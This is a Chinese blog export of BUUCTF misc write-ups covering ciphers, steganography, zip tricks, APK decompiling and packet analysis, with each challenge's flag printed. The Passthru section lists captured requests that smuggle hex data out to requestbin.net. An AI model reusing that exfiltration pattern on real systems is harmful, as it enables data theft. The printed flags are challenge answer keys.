class="line">UEsDBAoACQAAAOFTLkk/gs0NNAAAACgAAAAIABwAZmxhZy50eHRVVAkAA1aJ2Ve2h9xXdXgLAAEE6AMAAAToAwAAYrToA9yED6vL2Axm/JqV6236iHl0zKXB4CdAaOW9O+8glqQHuFocXUiDWXHqA+VHKkR0E1BLBwg/gs0NNAAAACgAAABQSwECHgMKAAkAAADhUy5JP4LNDTQAAAAoAAAACAAYAAAAAAABAAAAtIEAAAAAZmxhZy50eHRVVAUAA1aJ2Vd1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAAhgAAAAAA</span><br></pre></td></tr></table></figure><p>用网站<a href="https://passwordrecovery.io/zip-file-password-removal/%E5%BE%97%E5%88%B0%E5%AF%86%E7%A0%81skullandcrossbones">https://passwordrecovery.io/zip-file-password-removal/得到密码skullandcrossbones</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b31Ng_4_P1r4tE_1s_4lR1GHT_w1Th_M3&#125;</span><br></pre></td></tr></table></figure><h2 id="羊城杯-2020-signin"><a href="#羊城杯-2020-signin" class="headerlink" title="[羊城杯 2020]signin"></a>[羊城杯 2020]signin</h2><p>玩具总动员里面，巴斯光年成功上天，胡迪给他发了一段加密短信，但是不知道是什么？胡迪给了一段明文，一表人才，二表倒立</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BCEHACEIBDEIBDEHBDEHADEIACEGACFIBDFHACEGBCEHBCFIBDEGBDEGADFGBDEHBDEGBDFHBCEGACFIBCFGADEIADEIADFH</span><br></pre></td></tr></table></figure><p>根据玩具总动员的英文名是Toy Story，因此是toy密码。 <a href="https://eprint.iacr.org/2020/301.pdf">https://eprint.iacr.org/2020/301.pdf</a> 得到一表</p><p><img src="/image/media/2022/ctf/buu/6/16.png"></p><p>得到二表</p><p><img src="/image/media/2022/ctf/buu/6/17.png"></p><p>然后根据一表人才，二表倒立可以编写下面的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cipherdic = &#123;&#x27;M&#x27;:&#x27;ACEG&#x27;,&#x27;R&#x27;:&#x27;ADEG&#x27;,&#x27;K&#x27;:&#x27;BCEG&#x27;,&#x27;S&#x27;:&#x27;BDEG&#x27;,&#x27;A&#x27;:&#x27;ACEH&#x27;,&#x27;B&#x27;:&#x27;ADEH&#x27;,&#x27;L&#x27;:&#x27;BCEH&#x27;,&#x27;U&#x27;:&#x27;BDEH&#x27;,&#x27;D&#x27;:&#x27;ACEI&#x27;,&#x27;C&#x27;:&#x27;ADEI&#x27;,&#x27;N&#x27;:&#x27;BCEI&#x27;,&#x27;V&#x27;:&#x27;BDEI&#x27;,&#x27;H&#x27;:&#x27;ACFG&#x27;,&#x27;F&#x27;:&#x27;ADFG&#x27;,&#x27;O&#x27;:&#x27;BCFG&#x27;,&#x27;W&#x27;:&#x27;BDFG&#x27;,&#x27;T&#x27;:&#x27;ACFH&#x27;,&#x27;G&#x27;:&#x27;ADFH&#x27;,&#x27;P&#x27;:&#x27;BCFH&#x27;,&#x27;X&#x27;:&#x27;BDFH&#x27;,&#x27;E&#x27;:&#x27;ACFI&#x27;,&#x27;I&#x27;:&#x27;ADFI&#x27;,&#x27;Q&#x27;:&#x27;BCFI&#x27;,&#x27;Y&#x27;:&#x27;BDFI&#x27;&#125;</span><br><span class="line">cipher = &#x27;BCEHACEIBDEIBDEHBDEHADEIACEGACFIBDFHACEGBCEHBCFIBDEGBDEGADFGBDEHBDEGBDFHBCEGACFIBCFGADEIADEIADFH&#x27;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(0,len(cipher),4):</span><br><span class="line">    for k, v in cipherdic.items():</span><br><span class="line">        if v == cipher[i:i+4]:</span><br><span class="line">            flag = flag + k</span><br><span class="line">print(flag)#LDVUUCMEXMLQSSFUSXKEOCCG</span><br><span class="line">ciphertext = &#x27;LDVUUCMEXMLQSSFUSXKEOCCG&#x27;</span><br><span class="line">original_list = [&#x27;M&#x27;,&#x27;R&#x27;,&#x27;K&#x27;,&#x27;S&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;L&#x27;,&#x27;U&#x27;,&#x27;D&#x27;,&#x27;C&#x27;,&#x27;N&#x27;,&#x27;V&#x27;,&#x27;H&#x27;,&#x27;F&#x27;,&#x27;O&#x27;,&#x27;W&#x27;,&#x27;T&#x27;,&#x27;G&#x27;,&#x27;P&#x27;,&#x27;X&#x27;,&#x27;E&#x27;,&#x27;I&#x27;,&#x27;Q&#x27;,&#x27;Y&#x27;]</span><br><span class="line">reversed_list = original_list[::-1]#倒装后的表</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for char in ciphertext:</span><br><span class="line">    for i in range(len(original_list)):</span><br><span class="line">        if original_list[i] ==char:</span><br><span class="line">            flag=flag+reversed_list[i]</span><br><span class="line">print(flag)#GWHTTOYSAYGREENTEAISCOOL</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GWHT&#123;TOYSAYGREENTEAISCOOL&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2019-Passthru"><a href="#INSHack2019-Passthru" class="headerlink" title="[INSHack2019]Passthru"></a>[INSHack2019]Passthru</h2><p>给了一个流量包和一个sslkey.log文件，可以看到流量包中存在加密</p><p><img src="/image/media/2022/ctf/buu/6/18.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==GET</span><br></pre></td></tr></table></figure><p>过滤请求包，这些包的<code>URL</code>中有个参数名是：kcahsni，而题目名是：inshack</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D82290383-7480-487c-b78b-77ac769c56cd%26kcahsni%3D9ef773fe97f56554a3b4,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D8bd542b5-2056-489e-bc1c-4f028ef27894%26kcahsni%3D26cd07e1f71df3dcee9f,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3De76528cd-17d3-490a-be20-2d817ccee04e%26kcahsni%3D1eaf89725ab93968fc52,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D491c01dd-f1a3-43c3-b3c8-30c4ab73ff4b%26kcahsni%3Df03c0a7d653539616433,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3Deeed4c5d-8a5f-4b8c-a12d-a2ef007e09e2%26kcahsni%3D66333861303164636130,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3Db69d43cd-ac86-4b20-acc6-6a441d94ae3e%26kcahsni%3D30663937353965366432,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3De56bc952-42c2-4631-96ee-e2e7cac51406%26kcahsni%3D30353331373634326335,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3Dece42ab1-a9d1-44df-a0b5-6b7e83aa9cd0%26kcahsni%3D34323166636461643033,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D71ad1cf6-a31a-4694-812b-9ea5db6e3cad%26kcahsni%3D34656265373037376332,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D1b3c7025-b1a8-477f-9d16-89c254af258a%26kcahsni%3D62646464343732627b41,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D64ac599c-e5ac-43bc-a2e0-0447257cd5bc%26kcahsni%3D534e490b3295c3d06c24,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3Dd8af7f01-5b92-4ad3-8c80-c6af467eac30%26kcahsni%3Df2a8c7e8936667dbf7fe,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D01b77323-6be9-4abd-b427-9f09d992a4df%26kcahsni%3Dce28456a0fd24ac21ec6,encoded_image=,image_content=,filename=,hl=fr</span><br><span class="line">/searchbyimage?image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D3f3e4f2f-5d92-4d3a-8ce8-f11943b42df3%26kcahsni%3Da12e3efe4b,encoded_image=,image_content=,filename=,hl=fr</span><br></pre></td></tr></table></figure><p>取出来取出这些包的kcahsni的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kcahsni%3D9ef773fe97f56554a3b4</span><br><span class="line">kcahsni%3D26cd07e1f71df3dcee9f</span><br><span class="line">kcahsni%3D1eaf89725ab93968fc52</span><br><span class="line">kcahsni%3Df03c0a7d653539616433</span><br><span class="line">kcahsni%3D66333861303164636130</span><br><span class="line">kcahsni%3D30663937353965366432</span><br><span class="line">kcahsni%3D30353331373634326335</span><br><span class="line">kcahsni%3D34323166636461643033</span><br><span class="line">kcahsni%3D34656265373037376332</span><br><span class="line">kcahsni%3D62646464343732627b41</span><br><span class="line">kcahsni%3D534e490b3295c3d06c24</span><br><span class="line">kcahsni%3Df2a8c7e8936667dbf7fe</span><br><span class="line">kcahsni%3Dce28456a0fd24ac21ec6</span><br><span class="line">kcahsni%3Da12e3efe4b</span><br></pre></td></tr></table></figure><p>拼接一下得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9ef773fe97f56554a3b426cd07e1f71df3dcee9f1eaf89725ab93968fc52f03c0a7d653539616433663338613031646361303066393735396536643230353331373634326335343231666364616430333465626537303737633262646464343732627b41534e490b3295c3d06c24f2a8c7e8936667dbf7fece28456a0fd24ac21ec6a12e3efe4b</span><br></pre></td></tr></table></figure><p>逆序输出16进制转二进制，然后逆序输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;b274dddb2c7707ebe430dadcf1245c246713502d6e9579f00acd10a83f3da95e&#125;</span><br></pre></td></tr></table></figure><h2 id="WMCTF2020-行为艺术"><a href="#WMCTF2020-行为艺术" class="headerlink" title="[WMCTF2020]行为艺术"></a>[WMCTF2020]行为艺术</h2><p>打开看到crc报错，爆破得到正确是长宽，然后通过手动记录得到下面信息，看起来是个zip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">504B0304140000000800DB93C55086A39007D8000000DF01000008000000666C61672E74787475504B0E823010DD93708771DDCCB0270D5BBD0371815A9148AC6951C2ED9D271F89C62E2693D7F76BB7DE9FC80D2E6E68E782A326D2E01F81CE6D55E76972E9BA7BCCB3ACEF7B89F7B6E90EA16A6EE2439D45179ECDD1C5CCFB6B9AA489C1218C92B898779D765FCCBB58CC920B6662C5F91749931132258F32BBA7C288C5AE103133106608409DAC419F77241A3412907814AB7A922106B8DED0D25AEC8A634929025C46A33FE5A1D3167A100323B1ABEE4A7A0708413A19E17718165F5D3E73D577798E36D5144B66315AAE315078F5E51A29246AF402504B01021F00140009000800DB93C55086A39007D8000000DF010000080024000000000000002000000000000000666C61672E7478740A00200000000000010018004A0A9A64243BD601F9D8AB39243BD6012D00CA13223BD601504B050600000000010001005A000000FE00000000000000</span><br></pre></td></tr></table></figure><p>发现是伪加密，得到Brainfuck加密的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .&lt;+++ [-&gt;-- -&lt;]&gt;-</span><br><span class="line">.&lt;+++ +[-&gt;+ +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++</span><br><span class="line">++.-- --.&lt;+ +++[- &gt;---- &lt;]&gt;-- ----. +++++ +++.&lt; +++[- &gt;---&lt; ]&gt;-.+ ++.++</span><br><span class="line">+++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .+++. -.... --.++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++++. &lt;++++</span><br><span class="line">++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- --.&lt;+ +++[- &gt;++++ &lt;]&gt;+. +...&lt; +++++</span><br><span class="line">+++[- &gt;++++ ++++&lt; ]&gt;+++ +++++ +++.. .-.&lt; </span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMCTF&#123;wai_bi_baaaa_bo!2333~~~&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2018-Spreadshit"><a href="#INSHack2018-Spreadshit" class="headerlink" title="[INSHack2018]Spreadshit"></a>[INSHack2018]Spreadshit</h2><p>给了一个表格，但是里面看起来什么都没有，ctrl+F是搜索空格是由东西的，然后替换成黑色</p><p><img src="/image/media/2022/ctf/buu/6/20.png"></p><p>然后去格式里面列宽调整一下宽的值，然后得到flag</p><p><img src="/image/media/2022/ctf/buu/6/21.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;3cf6463910edffb0&#125;</span><br></pre></td></tr></table></figure><h2 id="GKCTF-2021-银杏岛の奇妙冒险"><a href="#GKCTF-2021-银杏岛の奇妙冒险" class="headerlink" title="[GKCTF 2021]银杏岛の奇妙冒险"></a>[GKCTF 2021]银杏岛の奇妙冒险</h2><p>打开文件存在一个路径<code>附件\.minecraft\saves\Where is the flag</code>根据文件夹的名字猜测flag</p><p>然后找<code>附件\.minecraft\saves\Where is the flag\customnpcs\quests</code>到三个任务</p><p>分别是寻找flag，支线，主线，在主线2.json中的得到下面字样的w3lc0me_猜测是flag中的一段</p><p><img src="/image/media/2022/ctf/buu/6/22.png"></p><p>在主线3.json中的得到下面字样的t0_9kctf_</p><p><img src="/image/media/2022/ctf/buu/6/23.png"></p><p>同理在其他的json寻找到完整flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;w3lc0me_t0_9kctf_2021_Check_1n&#125;</span><br><span class="line">GKCTF&#123;w3lc0me_t0_9kctf_2021_Check_1n&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buumisc(5)</title>
      <link href="/article/2022-03-10-buumisc(5)/"/>
      <url>/article/2022-03-10-buumisc(5)/</url>
      
        <content type="html"><![CDATA[<p>buu刷题目记录(第五页)</p><span id="more"></span><h1 id="buumisc-5"><a href="#buumisc-5" class="headerlink" title="buumisc(5)"></a>buumisc(5)</h1><p>buu第五页，取证什么的后面在一块学习一下，目前暂时跳过了</p><p><img src="/image/media/2022/ctf/buu/5/0.png"></p><h2 id="CTF2019-otaku"><a href="#CTF2019-otaku" class="headerlink" title="[*CTF2019]otaku"></a>[*CTF2019]otaku</h2><p>伪加密之后得到一个doc和一个zip，看到doc里面有大量信息，有空白，转换成GBK编码之后使用明文破解，得到密码My_waifu，解压后得到一个png+txt，zsteg分析png得到：zsteg flag.png </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ctf&#123;vI0l3t_Ev3rg@RdeN&#125;</span><br></pre></td></tr></table></figure><h2 id="UTCTF2020-sstv"><a href="#UTCTF2020-sstv" class="headerlink" title="[UTCTF2020]sstv"></a>[UTCTF2020]sstv</h2><p>得到一个文件wav文件，然后根据题目提示得到sstv</p><p>kali下安装和使用sstv，安装apt-get install qsstv</p><p>打开后Options-&gt;Configuration-&gt;Sound勾选From file</p><img src="/image/media/2022/ctf/buu/5/1.png" style="zoom:40%;" /><img src="/image/media/2022/ctf/buu/5/2.png" style="zoom:50%;" /><p>然后选择音源，点击这个小箭头然后选择音源</p><p><img src="/image/media/2022/ctf/buu/5/3.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;6bdfeac1e2baa12d6ac5384cdfd166b0&#125;</span><br></pre></td></tr></table></figure><h2 id="GKCTF-2021-excel-骚操作"><a href="#GKCTF-2021-excel-骚操作" class="headerlink" title="[GKCTF 2021]excel 骚操作"></a>[GKCTF 2021]excel 骚操作</h2><p>你真的了解excel吗</p><p>excel有的位置没有限制，但是里面有值，全选然后按照下图设置单元格格式，发现出来了很多个1</p><p><img src="/image/media/2022/ctf/buu/5/4.png"></p><p>猜测是个二维码，然后把有数字的弄上颜色</p><p><img src="/image/media/2022/ctf/buu/5/5.png"></p><p>然后设置行高27，得到下面这个码，发现是汉信码</p><p><img src="/image/media/2022/ctf/buu/5/6.png"></p><p>识别得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9ee0cb62-f443-4a72-e9a3-43c0b910757e&#125;</span><br></pre></td></tr></table></figure><h2 id="真的很杂"><a href="#真的很杂" class="headerlink" title="真的很杂"></a>真的很杂</h2><p>binwalk+foremost分离得到jpg，png，zip文件夹，通过png文件夹猜测zip应该是个apk</p><p>需要用到工具dex2jar：下载：<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a>            把dex转换成jar</p><p>jd-gui：github地址： <a href="https://github.com/java-decompiler/jd-gui">https://github.com/java-decompiler/jd-gui</a>                        把jar转换成java伪代码</p><p>把classes.dex放在文件夹dex2jar里：cmd执行命令：d2j-dex2jar.bat classes.dex</p><p>得到一个jar包，然后用这个包放在jd-gui中得到java代码</p><p><img src="/image/media/2022/ctf/buu/5/7.png"></p><p>得到flag:”flag{25f991b27f” + i + “dc2f7a82a2b34” + j + “86e81c4}”);分析代码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25f991b27fcdc2f7a82a2b34386e81c4&#125;</span><br></pre></td></tr></table></figure><h2 id="greatescape"><a href="#greatescape" class="headerlink" title="greatescape"></a>greatescape</h2><p>流量分析“tcp contains “你要找的关键字””可以快速定位到数据包</p><p>追中TCP流，在tcp.stream eq 18，发现ssc.key</p><p>在tcp.stream eq 19得到里面的内容，先存一个ssc.key</p><p>然后在编辑》首选项</p><p><img src="/image/media/2022/ctf/buu/5/8.png"></p><p>Protocols》TLS》edit》点击+》添加Key File》选择刚刚保存的ssc.key</p><p><img src="/image/media/2022/ctf/buu/5/9.png"></p><p>然后这个时候就能看到tls流里面的信息了，在tcp.stream eq 80发现flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INS&#123;OkThatWasWay2Easy&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2019-INSAnity"><a href="#INSHack2019-INSAnity" class="headerlink" title="[INSHack2019]INSAnity"></a>[INSHack2019]INSAnity</h2><p>Are you back for more INSAnity!?</p><p>** Warning ** : this challenge will cost you 2 points (but will give you soooo much fame)</p><p>打开就得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;YouRe_Crazy_and_I_Love_it&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2019-Sanity"><a href="#INSHack2019-Sanity" class="headerlink" title="[INSHack2019]Sanity"></a>[INSHack2019]Sanity</h2><p>Welcome! Respect others, learn and have fun :)</p><p>打开就得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;Welcome&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2017-insanity"><a href="#INSHack2017-insanity" class="headerlink" title="[INSHack2017]insanity-"></a>[INSHack2017]insanity-</h2><p>Challenge description:</p><p>We dare you to validate this challenge that will REALLY remove 2pts from your score! If you really are crazy, then here is your flag: </p><p>打开就得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;Youre_crazy_I_like_it&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2018-INSanity"><a href="#INSHack2018-INSanity" class="headerlink" title="[INSHack2018]INSanity"></a>[INSHack2018]INSanity</h2><p>打开得flag</p><p>Are you playing?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;let_the_game_begin!&#125;</span><br></pre></td></tr></table></figure><h2 id="key不在这里"><a href="#key不在这里" class="headerlink" title="key不在这里"></a>key不在这里</h2><p>打开得到一个二维码，识别得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cn.bing.com/search?q=key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&amp;m=10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&amp;qs=n&amp;form=QBRE&amp;sp=-1&amp;sc=0-38&amp;sk=&amp;cvid=2CE15329C18147CBA4C1CA97C8E1BB8C</span><br></pre></td></tr></table></figure><p>发现比较特殊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568</span><br></pre></td></tr></table></figure><p>然后转化一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import unquote</span><br><span class="line">s=&quot;10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&quot;</span><br><span class="line">x=len(s)//2</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(x):</span><br><span class="line">    if len(s) != 0:</span><br><span class="line">        if  int(s[:3])&lt; 127:</span><br><span class="line">            flag += chr(int(s[:3]))</span><br><span class="line">            s = s[3:]</span><br><span class="line">        else:</span><br><span class="line">            flag += chr(int(s[:2]))</span><br><span class="line">            s = s[2:]</span><br><span class="line">print(unquote(flag, &#x27;utf-8&#x27;))  #url解码一次</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5d45fa256372224f48746c6fb8e33b32&#125;</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-小O的考研复试"><a href="#MRCTF2020-小O的考研复试" class="headerlink" title="[MRCTF2020]小O的考研复试"></a>[MRCTF2020]小O的考研复试</h2><p>打开有个公式需要我们跑结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=2</span><br><span class="line">for i in range(19260816):</span><br><span class="line">    a = a * 10 + 2</span><br><span class="line">    a%=(1e9+7)</span><br><span class="line">print(a)#577302567.0</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;577302567&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2018-Self-Congratulation"><a href="#INSHack2018-Self-Congratulation" class="headerlink" title="[INSHack2018]Self Congratulation"></a>[INSHack2018]Self Congratulation</h2><p>下载图片可以看到做左上角有个细节横着看</p><p><img src="/image/media/2022/ctf/buu/5/10.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00110001001</span><br><span class="line">10010001100</span><br><span class="line">11001101000</span><br><span class="line">01101010011</span><br><span class="line">01100011011</span><br><span class="line">10011100000</span><br></pre></td></tr></table></figure><p>转换得到12345678flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12345678&#125;</span><br></pre></td></tr></table></figure><h2 id="BSidesSF2019-table-tennis"><a href="#BSidesSF2019-table-tennis" class="headerlink" title="[BSidesSF2019]table-tennis"></a>[BSidesSF2019]table-tennis</h2><p>过滤一下有DNS、TCP、TLS、ICMP流，过滤ICMP有html，看到1135包有信息</p><p><img src="/image/media/2022/ctf/buu/5/11.png"></p><p>整理得到被下面内容</p><p>Q1RGe0p1c3RBUzBuZ0FiMHV0UDFuZ1Awbmd9经base64处理后得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;JustAS0ngAb0utP1ngP0ng&#125;</span><br></pre></td></tr></table></figure><h2 id="很好的色彩呃？"><a href="#很好的色彩呃？" class="headerlink" title="很好的色彩呃？"></a>很好的色彩呃？</h2><p>得到条纹图，可能要识别颜色然后转字符，没有PS，就直接用QQ截图提取颜色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">139，139，97</span><br><span class="line">139，139，97</span><br><span class="line">139，139，112</span><br><span class="line">139，139，106</span><br><span class="line">139，139，101</span><br><span class="line">139，139，115</span><br></pre></td></tr></table></figure><p>97，97，112，106，101，115&gt;得到aapjes</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aapjes&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2019-gflag"><a href="#INSHack2019-gflag" class="headerlink" title="[INSHack2019]gflag"></a>[INSHack2019]gflag</h2><p>My brother likes esoteric programming. He sent me this file but I don’t see what it is for. Could you help me ?</p><p>猜测是一种programming，G语言<a href="https://ncviewer.com/%E5%8F%AF%E4%BB%A5%E5%9C%A8%E7%BA%BF%E8%BF%90%E8%A1%8C%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%B0%83%E6%95%B4%E8%A7%92%E5%BA%A6%EF%BC%8C%E5%BE%97%E5%88%B0flag">https://ncviewer.com/可以在线运行，可以调整角度，得到flag</a></p><p><img src="/image/media/2022/ctf/buu/5/12.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSA&#123;3d_pr1nt3d_fl49&#125;</span><br></pre></td></tr></table></figure><h2 id="ACTF新生赛2020-frequency"><a href="#ACTF新生赛2020-frequency" class="headerlink" 